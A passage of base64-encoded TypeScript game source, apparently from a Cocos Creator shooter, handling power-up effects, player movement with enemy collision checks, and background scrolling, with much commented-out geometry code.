wSUQpO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5odWlYdWUoTWF0aC5mbG9vcih0aGlzLm1heEhwKjAuMykpO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgOTpcclxuICAgICAgICAgICAgICAgIHRoaXMucm9sZS5hZGRTdXBwbHkocHJvcElEKTtcclxuICAgICAgICAgICAgICAgIHByb3BNb3ZlKCk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnJvbGUuYWNjU3BlZWQgPSAxLjU7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAxMDpcclxuICAgICAgICAgICAgICAgIHByb3BNb3ZlKCk7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAxMjpcclxuICAgICAgICAgICAgICAgIHRoaXMucm9sZS5hZGRTdXBwbHkocHJvcElEKTtcclxuICAgICAgICAgICAgICAgIHByb3BNb3ZlKCk7XHJcbiAgICAgICAgICAgICAgICBHYW1lUHJveHkuZ29sZE11bCA9IDI7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAxMzpcclxuICAgICAgICAgICAgICAgIEdhbWVQcm94eS5tYWduZXRpYyA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICBwcm9wTW92ZSgpO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgMTAyOlxyXG4gICAgICAgICAgICBjYXNlIDEwMzpcclxuICAgICAgICAgICAgY2FzZSAxMDQ6XHJcbiAgICAgICAgICAgIGNhc2UgMTA1OlxyXG4gICAgICAgICAgICBjYXNlIDEwNjpcclxuICAgICAgICAgICAgY2FzZSAxMDc6XHJcbiAgICAgICAgICAgIGNhc2UgMTA4OlxyXG4gICAgICAgICAgICBjYXNlIDEwOTpcclxuICAgICAgICAgICAgY2FzZSAxMTA6XHJcbiAgICAgICAgICAgICAgICBpZiAodGhpcy5idWxsZXRFbWl0dGVyID09IHByb3BJRCAtIDEwMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5idWxsZXRFbWl0dGVyRGVsZWdhdGUuYnVsbGV0Q291bnQgPSB0aGlzLmJ1bGxldEVtaXR0ZXJEZWxlZ2F0ZS5wYXlsb2FkO1xyXG4gICAgICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMuYnVsbGV0RW1pdHRlciA9IHByb3BJRCAtIDEwMDtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBvblByb3BDRFplcm8oaWQ6bnVtYmVyKXtcclxuICAgICAgICBzd2l0Y2ggKGlkKXtcclxuICAgICAgICAgICAgY2FzZSA1OlxyXG4gICAgICAgICAgICAgICAgdGhpcy5pbXBlbmV0cmFibGVEZWZlbmNlLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSA5OlxyXG4gICAgICAgICAgICAgICAgdGhpcy5yb2xlLmFjY1NwZWVkID0gMTtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIDEwOlxyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgMTI6XHJcbiAgICAgICAgICAgICAgICBHYW1lUHJveHkuZ29sZE11bCA9IDE7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAxMzpcclxuICAgICAgICAgICAgICAgIEdhbWVQcm94eS5tYWduZXRpYyA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgX2JnTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuICAgIHByaXZhdGUgX3NjcmVlblJlY3Q6Y2MuUmVjdCA9IGNjLnJlY3QoMCwgMCwgY2MudmlzaWJsZVJlY3Qud2lkdGgsIGNjLnZpc2libGVSZWN0LmhlaWdodCk7XHJcblxyXG4gICAgc3RhcnQoKXtcclxuICAgICAgICBsZXQgYmdOb2RlID0gdGhpcy5yb2xlLm5vZGUuZ2V0UGFyZW50KCk7XHJcbiAgICAgICAgdGhpcy5fYmdOb2RlID0gYmdOb2RlO1xyXG4gICAgICAgIHRoaXMuX3JvbGVCb3VuZHMueCA9IC1iZ05vZGUud2lkdGgvMiArIHRoaXMucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cztcclxuICAgICAgICB0aGlzLl9yb2xlQm91bmRzLnkgPSAtYmdOb2RlLmhlaWdodC8yICsgdGhpcy5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzO1xyXG4gICAgICAgIHRoaXMuX3JvbGVCb3VuZHMud2lkdGggPSBiZ05vZGUud2lkdGggLSB0aGlzLnJvbGUuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXMqMjtcclxuICAgICAgICB0aGlzLl9yb2xlQm91bmRzLmhlaWdodCA9IGJnTm9kZS5oZWlnaHQgLSB0aGlzLnJvbGUuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXMqMjtcclxuXHJcbiAgICAgICAgdGhpcy5fYmdCb3VuZHMueCA9IC10aGlzLmJnTGF5ZXIud2lkdGgvMiArIGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS53aWR0aC8yO1xyXG4gICAgICAgIHRoaXMuX2JnQm91bmRzLnkgPSAtdGhpcy5iZ0xheWVyLmhlaWdodC8yICsgY2Mudmlldy5nZXRWaXNpYmxlU2l6ZSgpLmhlaWdodC8yO1xyXG4gICAgICAgIHRoaXMuX2JnQm91bmRzLndpZHRoID0gdGhpcy5iZ0xheWVyLndpZHRoIC0gY2Mudmlldy5nZXRWaXNpYmxlU2l6ZSgpLndpZHRoO1xyXG4gICAgICAgIHRoaXMuX2JnQm91bmRzLmhlaWdodCA9IHRoaXMuYmdMYXllci5oZWlnaHQgLSBjYy52aWV3LmdldFZpc2libGVTaXplKCkuaGVpZ2h0O1xyXG5cclxuXHJcbiAgICAgICAgLy8gY29uc29sZS5sb2codGhpcy5fcm9sZUJvdW5kcywgXCJ0aGlzLl9yb2xlQm91bmRzPT09PlwiKTtcclxuICAgICAgICAvLyBsZXQgbm9kZSA9IG5ldyBjYy5Ob2RlKCk7XHJcbiAgICAgICAgLy8gYmdOb2RlLmFkZENoaWxkKG5vZGUpO1xyXG4gICAgICAgIC8vIGxldCBncmFwaGljID0gbm9kZS5hZGRDb21wb25lbnQoY2MuR3JhcGhpY3MpO1xyXG4gICAgICAgIC8vIGdyYXBoaWMuc3Ryb2tlQ29sb3IgPSBjYy5Db2xvci5SRUQ7XHJcbiAgICAgICAgLy8gZ3JhcGhpYy5saW5lV2lkdGggPSA1O1xyXG4gICAgICAgIC8vIGdyYXBoaWMucmVjdCgtYmdOb2RlLndpZHRoLzIsIC1iZ05vZGUuaGVpZ2h0LzIsIGJnTm9kZS53aWR0aCwgYmdOb2RlLmhlaWdodCk7XHJcbiAgICAgICAgLy8gZ3JhcGhpYy5zdHJva2UoKTtcclxuICAgICAgICAvL1xyXG4gICAgICAgIC8vIGdyYXBoaWMgPSB0aGlzLnJvbGUubm9kZS5hZGRDb21wb25lbnQoY2MuR3JhcGhpY3MpO1xyXG4gICAgICAgIC8vIGdyYXBoaWMuc3Ryb2tlQ29sb3IgPSBjYy5Db2xvci5SRUQ7XHJcbiAgICAgICAgLy8gZ3JhcGhpYy5saW5lV2lkdGggPSAzO1xyXG4gICAgICAgIC8vIGdyYXBoaWMuY2lyY2xlKHRoaXMucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLm9mZnNldC54LCB0aGlzLnJvbGUuc3BhY2VDaXJjbGVDb2xsaWRlci5vZmZzZXQueSwgdGhpcy5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzKTtcclxuICAgICAgICAvLyBncmFwaGljLnN0cm9rZSgpO1xyXG4gICAgICAgIC8qKiDnp7vliqjmjqfliLYgKi9cclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKEFjdGlvbnMudXBkYXRlKGR0PT57XHJcbiAgICAgICAgICAgIC8qKlxyXG4gICAgICAgICAgICAgKiDop5LoibLnp7vliqhcclxuICAgICAgICAgICAgICog5pyJ5o6n5Yi255qE5oOF5Ya15LiL5omN6IO956e75YqoXHJcbiAgICAgICAgICAgICAqIOWwj+S6jui+ueeVjOWGheaJjeiDveenu+WKqFxyXG4gICAgICAgICAgICAgKiAqL1xyXG4gICAgICAgICAgICBsZXQgcm9sZU1vdmVMZW4gPSB0aGlzLnJvbGUuc3BlZWQqZHQ7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9iTW92ZSAmJiAhR2FtZVByb3h5LnBhdXNlR2FtZSl7XHJcbiAgICAgICAgICAgICAgICBsZXQgZGVsdGFQb3MgPSB0aGlzLl9kaXIubXVsKHJvbGVNb3ZlTGVuKTtcclxuICAgICAgICAgICAgICAgIGxldCBkZXN0UG9zID0gdGhpcy5yb2xlLm5vZGUucG9zaXRpb24uYWRkKGRlbHRhUG9zKTtcclxuXHJcbiAgICAgICAgICAgICAgICBsZXQgYXJyOkFycmF5PEFBQkJSZWdpb24+ID0gW107XHJcbiAgICAgICAgICAgICAgICB3aW5kb3dbJ0dhbWVDb2xsaXNpb25Db250cm9sbGVyJ10ubG9vc2VRdWFkVHJlZS5yZXRyaWV2ZSh0aGlzLnJvbGUucm9sZUFBQkIuYWFiYigpLGFycik7XHJcbiAgICAgICAgICAgICAgICBsZXQgZmxhZyA9IGZhbHNlO1xyXG5cclxuICAgICAgICAgICAgICAgIGZvciAobGV0IGFhYmJSZWdpb24gb2YgYXJyKXtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgZW5lbXkgPSAoPEVuZW15QUFCQj5hYWJiUmVnaW9uKS5lbmVteTtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZW5lbXkubm9kZS5wb3NpdGlvbi5zdWIoZGVzdFBvcykubWFnKCkgPCBlbmVteS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyArIHRoaXMucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGZsYWcgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBpZiAoIWZsYWcpe1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkZXN0UG9zLnggPiB0aGlzLl9yb2xlQm91bmRzLnhNYXggfHwgZGVzdFBvcy54IDwgdGhpcy5fcm9sZUJvdW5kcy54TWluIHx8IGRlc3RQb3MueSA+IHRoaXMuX3JvbGVCb3VuZHMueU1heCB8fCBkZXN0UG9zLnkgPCB0aGlzLl9yb2xlQm91bmRzLnlNaW4pe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBmbGFnID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAgICAgaWYgKCFmbGFnKXtcclxuICAgICAgICAgICAgICAgICAgICB0aGlzLnJvbGUubm9kZS5wb3NpdGlvbiA9IGRlc3RQb3M7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAvKmlmIChkZWx0YVBvcy54ID4gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGRlc3RQb3MueCA+IHRoaXMuX3JvbGVCb3VuZHMueE1heCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc3RQb3MueCA9IHRoaXMuX3JvbGVCb3VuZHMueE1heDtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9ZWxzZSBpZiAoZGVsdGFQb3MueCA8IDApe1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkZXN0UG9zLnggPCB0aGlzLl9yb2xlQm91bmRzLnhNaW4pe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXN0UG9zLnggPSB0aGlzLl9yb2xlQm91bmRzLnhNaW47XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIChkZWx0YVBvcy55ID4gMCl7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGRlc3RQb3MueSA+IHRoaXMuX3JvbGVCb3VuZHMueU1heCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc3RQb3MueSA9IHRoaXMuX3JvbGVCb3VuZHMueU1heDtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9ZWxzZSBpZiAoZGVsdGFQb3MueSA8IDApe1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkZXN0UG9zLnkgPCB0aGlzLl9yb2xlQm91bmRzLnlNaW4pe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXN0UG9zLnkgPSB0aGlzLl9yb2xlQm91bmRzLnlNaW47XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSovXHJcblxyXG5cclxuICAgICAgICAgICAgICAgIC8vIGxldCBpbnRlcnNlY3Rpb25zID0gW107XHJcbiAgICAgICAgICAgICAgICAvLyAvKiog5rGC57q/5q615LiO6L6557q/55qE5Lqk54K5ICovXHJcbiAgICAgICAgICAgICAgICAvLyBpZiAoZGVsdGFQb3MueCA+IDAgJiYgZGVzdFBvcy54ID4gdGhpcy5fcm9sZUJvdW5kcy54TWF4KXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAvL+S4juWPs+i+ueeVjOeahOS6pOeCuVxyXG4gICAgICAgICAgICAgICAgLy8gICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgaWYoY2MuSW50ZXJzZWN0aW9uLnBMaW5lSW50ZXJzZWN0KHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9yb2xlQm91bmRzLnhNYXgsIHRoaXMuX3JvbGVCb3VuZHMueU1pbiksIGNjLnYyKHRoaXMuX3JvbGVCb3VuZHMueE1heCwgdGhpcy5fcm9sZUJvdW5kcy55TWF4KSwgcG9pbnQpKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIC8vICAgICB9XHJcbiAgICAgICAgICAgICAgICAvLyB9XHJcbiAgICAgICAgICAgICAgICAvLyBpZiAoZGVsdGFQb3MueCA8IDAgJiYgZGVzdFBvcy54IDwgdGhpcy5fcm9sZUJvdW5kcy54TWluKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAvL+S4juW3pui+ueeVjOeahOS6pOeCuVxyXG4gICAgICAgICAgICAgICAgLy8gICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgaWYoY2MuSW50ZXJzZWN0aW9uLnBMaW5lSW50ZXJzZWN0KHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9yb2xlQm91bmRzLnhNaW4sIHRoaXMuX3JvbGVCb3VuZHMueU1pbiksIGNjLnYyKHRoaXMuX3JvbGVCb3VuZHMueE1pbiwgdGhpcy5fcm9sZUJvdW5kcy55TWF4KSwgcG9pbnQpKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIC8vICAgICB9XHJcbiAgICAgICAgICAgICAgICAvLyB9XHJcbiAgICAgICAgICAgICAgICAvLyBpZiAoZGVsdGFQb3MueSA+IDAgJiYgZGVzdFBvcy55ID4gdGhpcy5fcm9sZUJvdW5kcy55TWF4KXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAvL+S4juS4iui+ueeVjOeahOS6pOeCuVxyXG4gICAgICAgICAgICAgICAgLy8gICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgaWYoY2MuSW50ZXJzZWN0aW9uLnBMaW5lSW50ZXJzZWN0KHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9yb2xlQm91bmRzLnhNaW4sIHRoaXMuX3JvbGVCb3VuZHMueU1heCksIGNjLnYyKHRoaXMuX3JvbGVCb3VuZHMueE1heCwgdGhpcy5fcm9sZUJvdW5kcy55TWF4KSwgcG9pbnQpKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIC8vICAgICB9XHJcbiAgICAgICAgICAgICAgICAvLyB9XHJcbiAgICAgICAgICAgICAgICAvLyBpZiAoZGVsdGFQb3MueSA8IDAgJiYgZGVzdFBvcy55IDwgdGhpcy5fcm9sZUJvdW5kcy55TWluKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAvL+S4juS4i+i+ueeVjOeahOS6pOeCuVxyXG4gICAgICAgICAgICAgICAgLy8gICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgaWYoY2MuSW50ZXJzZWN0aW9uLnBMaW5lSW50ZXJzZWN0KHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9yb2xlQm91bmRzLnhNaW4sIHRoaXMuX3JvbGVCb3VuZHMueU1pbiksIGNjLnYyKHRoaXMuX3JvbGVCb3VuZHMueE1heCwgdGhpcy5fcm9sZUJvdW5kcy55TWluKSwgcG9pbnQpKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIC8vICAgICB9XHJcbiAgICAgICAgICAgICAgICAvLyB9XHJcblxyXG4gICAgICAgICAgICAgICAgLyoqIOaxgue6v+auteS4juWchueahOS6pOeCuSAqL1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIGFyci5mb3JFYWNoKHZhbHVlID0+IHtcclxuICAgICAgICAgICAgICAgIC8vICAgICBsZXQgZW5lbXkgPSB2YWx1ZS5nZXRDb21wb25lbnQoRW5lbXkpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgIC8vIGNjLkludGVyc2VjdGlvbi5wTGluZUNpcmNsZSh0aGlzLnJvbGUubm9kZS5wb3NpdGlvbiwgZGVzdFBvcywge3Bvc2l0aW9uOmVuZW15Lm5vZGUucG9zaXRpb24sIHJhZGl1czplbmVteS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1c30sIGludGVyc2VjdGlvbnMpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgIGxldCBkb3VibGVSYWRpdXMgPSBlbmVteS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyArIHRoaXMucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cztcclxuICAgICAgICAgICAgICAgIC8vICAgICBpZiAoY2MuSW50ZXJzZWN0aW9uLnBvaW50TGluZURpc3RhbmNlKGVuZW15Lm5vZGUucG9zaXRpb24sIHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCB0cnVlKSA8IGRvdWJsZVJhZGl1cyl7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIGNvbnNvbGUubG9nKFwi5LiO5oCq54mp55u45Lqk77yM5rGC5pyA5bCP56e75Yqo6Led56a7XCIpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAvKiog6Led56a7ICovXHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIGxldCBjZW50ZXJTdWIgPSBlbmVteS5ub2RlLnBvc2l0aW9uLnN1Yih0aGlzLnJvbGUubm9kZS5wb3NpdGlvbik7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIGxldCBjZW50ZXJMZW4gPSBjZW50ZXJTdWIubWFnKCk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIGlmIChjZW50ZXJMZW4gPiBkb3VibGVSYWRpdXMpe1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgLyoqIOaxguWkueinkiAqL1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgbGV0IHJhZGlhbnMgPSBkZXN0UG9zLmFuZ2xlKGNlbnRlclN1Yik7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgICAgICBpZiAocmFkaWFucyA+IDApe1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgICAgIC8qKiDmsYLlnoLnur8gKi9cclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgICAgICBsZXQgdkxlbiA9IGNlbnRlckxlbiAqIE1hdGguc2luKHJhZGlhbnMpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgICAgIGlmICh2TGVuIDwgZG91YmxlUmFkaXVzKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgICAgICAgICAgbGV0IHNpZGVMZW4gPSBNYXRoLnNxcnQoZG91YmxlUmFkaXVzKmRvdWJsZVJhZGl1cyAtIHZMZW4qdkxlbik7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgICAgICAgICAgICAgIGxldCBoTGVuID0gY2VudGVyTGVuICogTWF0aC5jb3MocmFkaWFucyk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgICAgICAgICAgICAgIGludGVyc2VjdGlvbnMucHVzaCh0aGlzLm5vZGUucG9zaXRpb24uYWRkKHRoaXMuX2Rpci5tdWwoaExlbiAtIHNpZGVMZW4pKSk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgICAgICBpbnRlcnNlY3Rpb25zLnB1c2godGhpcy5ub2RlLnBvc2l0aW9uLmFkZCh0aGlzLl9kaXIubXVsKGNlbnRlckxlbiAtIGRvdWJsZVJhZGl1cykpKTtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgLy8gICAgIH1cclxuICAgICAgICAgICAgICAgIC8vIH0pO1xyXG5cclxuICAgICAgICAgICAgICAgIC8vIGlmIChpbnRlcnNlY3Rpb25zLmxlbmd0aCA+IDApe1xyXG4gICAgICAgICAgICAgICAgLy8gICAgIGNvbnNvbGUubG9nKGludGVyc2VjdGlvbnMsIFwiaW50ZXJzZWN0aW9ucy4uXCIpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgIGlmIChpbnRlcnNlY3Rpb25zLmxlbmd0aCA9PSAxKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgbGV0IHQgPSBjYy52MigpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICB0aGlzLnJvbGUubm9kZS5wb3NpdGlvbiA9IGludGVyc2VjdGlvbnNbMF0uYWRkU2VsZih0aGlzLl9kaXIubmVnKHQpKTtcclxuICAgICAgICAgICAgICAgIC8vICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIC8qKiDmsYLot53nprtyb2xl5pyA6L+R55qE6YKj5LiqICovXHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIGxldCBwID0gaW50ZXJzZWN0aW9uc1swXTtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgbGV0IG1pbkRpc3RhbmNlID0gcC5zdWIodGhpcy5yb2xlLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICBmb3IgKGxldCBpPTE7IGk8aW50ZXJzZWN0aW9ucy5sZW5ndGg7IGkrKyl7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgICAgICBsZXQgbWFnID0gaW50ZXJzZWN0aW9uc1tpXS5zdWIodGhpcy5yb2xlLm5vZGUucG9zaXRpb24pLm1hZygpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICAgICAgaWYgKG1hZyA8IG1pbkRpc3RhbmNlKXtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgICAgICBwID0gaW50ZXJzZWN0aW9uc1tpXTtcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgICAgICBtaW5EaXN0YW5jZSA9IG1hZztcclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIC8vICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgLy8gICAgICAgICBsZXQgdCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgICAgIHRoaXMucm9sZS5ub2RlLnBvc2l0aW9uID0gcC5hZGRTZWxmKHRoaXMuX2Rpci5uZWcodCkpO1xyXG4gICAgICAgICAgICAgICAgLy8gICAgIH1cclxuICAgICAgICAgICAgICAgIC8vIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAvLyAgICAgdGhpcy5yb2xlLm5vZGUucG9zaXRpb24gPSBkZXN0UG9zO1xyXG4gICAgICAgICAgICAgICAgLy8gfVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAvKipcclxuICAgICAgICAgICAgICog5Zyw5Zu+55qE56e75YqoXHJcbiAgICAgICAgICAgICAqIC0t5a6D55qE56e75Yqo6YCf5bqm5q+U6KeS6Imy6KaB5oWi5LiA54K5XHJcbiAgICAgICAgICAgICAqIC0t6KaB5L+d6K+B6KeS6Imy55qE54K55Zyo5bGP5bmV5Lit5b+DXHJcbiAgICAgICAgICAgICAqICovXHJcbiAgICAgICAgICAgIGxldCBzdWIgPSBjYy52MigtdGhpcy5yb2xlLm5vZGUueCwgLXRoaXMucm9sZS5ub2RlLnkpLnN1YihiZ05vZGUucG9zaXRpb24pO1xyXG4gICAgICAgICAgICBsZXQgbWFnID0gc3ViLm1hZygpO1xyXG4gICAgICAgICAgICBsZXQgbm9ybWFsaXplID0gc3ViLm5vcm1hbGl6ZSgpO1xyXG4gICAgICAgICAgICBpZiAobWFnID4gMCl7XHJcbiAgICAgICAgICAgICAgICBsZXQgc3BlZWQgPSByb2xlTW92ZUxlbioobWFnPjUwPzE6NS82KTtcclxuICAgICAgICAgICAgICAgIGxldCB4ID0gc3BlZWQqbm9ybWFsaXplLng7XHJcbiAgICAgICAgICAgICAgICBsZXQgeSA9IHNwZWVkKm5vcm1hbGl6ZS55O1xyXG4gICAgICAgICAgICAgICAgaWYgKE1hdGguYWJzKHgpID4gTWF0aC5hYnMoc3ViLngpKXtcclxuICAgICAgICAgICAgICAgICAgICB4ID0gc3ViLng7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBpZiAoTWF0aC5hYnMoeSkgPiBNYXRoLmFicyhzdWIueSkpe1xyXG4gICAgICAgICAgICAgICAgICAgIHkgPSBzdWIueTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGxldCBkZXN0WCA9IGJnTm9kZS54ICsgeDtcclxuICAgICAgICAgICAgICAgIGxldCBkZXN0WSA9IGJnTm9kZS55ICsgeTtcclxuICAgICAgICAgICAgICAgIGlmIChkZXN0WCA8IHRoaXMuX2JnQm91bmRzLnhNaW4pe1xyXG4gICAgICAgICAgICAgICAgICAgIGRlc3RYID0gdGhpcy5fYmdCb3VuZHMueE1pbjtcclxuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoZGVzdFggPiB0aGlzLl9iZ0JvdW5kcy54TWF4KXtcclxuICAgICAgICAgICAgICAgICAgICBkZXN0WCA9IHRoaXMuX2JnQm91bmRzLnhNYXg7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBpZiAoZGVzdFkgPCB0aGlzLl9iZ0JvdW5kcy55TWluKXtcclxuICAgICAgICAgICAgICAgICAgICBkZXN0WSA9IHRoaXMuX2JnQm91bmRzLnlNaW47XHJcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGRlc3RZID4gdGhpcy5fYmdCb3VuZHMueU1heCl7XHJcbiAgICAgICAgICAgICAgICAgICAgZGVzdFkgPSB0aGlzLl9iZ0JvdW5kcy55TWF4O1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgYmdOb2RlLnggPSBkZXN0WDtcclxuICAgICAgICAgICAgICAgIGJnTm9kZS55ID0gZGVzdFk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KSk7XHJcbiAgICAgICAgbGV0IGdhbWVFbmVteXNDb250cm9sbGVyID0gd2luZG93WydHYW1lRW5lbXlzQ29udHJvbGxlciddO1xyXG4gICAgICAgIGlmIChHYW1lUHJve